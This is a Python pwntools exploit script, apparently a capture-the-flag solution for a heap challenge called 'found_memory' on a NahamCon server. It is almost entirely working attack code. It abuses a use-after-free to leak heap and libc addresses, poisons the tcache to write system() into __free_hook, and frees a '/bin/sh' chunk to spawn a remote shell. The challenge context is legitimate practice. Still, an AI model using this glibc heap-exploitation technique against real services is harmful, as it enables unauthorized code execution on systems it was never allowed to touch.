#!/usr/bin/env python3
# Local Ubuntu 24.04

from pwn import *

context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = "./found_memory_patched"
elf  = ELF(BINARY, checksec=False)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "challenge.nahamcon.com"
  PORT = 32611
  s = remote(HOST, PORT)
else:
  s = process(BINARY)
libc = elf.libc

def Alloc():
  s.sendlineafter(b"> ", b"1")

def Free(idx):
  s.sendlineafter(b"> ", b"2")
  s.sendlineafter(b"free: ", str(idx).encode())

def View(idx):
  s.sendlineafter(b"> ", b"3")
  s.sendlineafter(b"view: ", str(idx).encode())

def Edit(idx, data):
  s.sendlineafter(b"> ", b"4")
  s.sendlineafter(b"edit: ", str(idx).encode()) 
  s.sendlineafter(b"data: ", data)

def Exit():
  s.sendlineafter(b"> ", b"5")

# heap leak
Alloc()
Alloc()
Free(0)
Free(1)
View(1)
heap_leak = u64(s.recvn(8))
heap_base = heap_leak - 0x2a0
print("heap_leak =", hex(heap_leak))
print("heap_base =", hex(heap_base))

for i in range(0x14):
  Alloc()

# tcache poisonig
Free(0)
Free(1)
Edit(1, p64(heap_base+ 0x310))

# libc leak
Alloc()
Alloc()
Edit(1, p64(0)+p64(0x441))
Free(2)
View(2)
libc_leak = u64(s.recvn(8))
libc_base = libc_leak - 0x1ecbe0
print("libc_leak =", hex(libc_leak))
print("libc_base =", hex(libc_base))

free_hook = libc_base + libc.sym.__free_hook
system_addr = libc_base + libc.sym.system

# write system() in __free_hook
Free(3)
Free(4)
Edit(4, p64(free_hook))
Alloc()
Alloc()
Edit(3, p64(system_addr))

# start system("/bin/sh")
Edit(0, b"/bin/sh\x00")
Free(0) 

s.interactive()
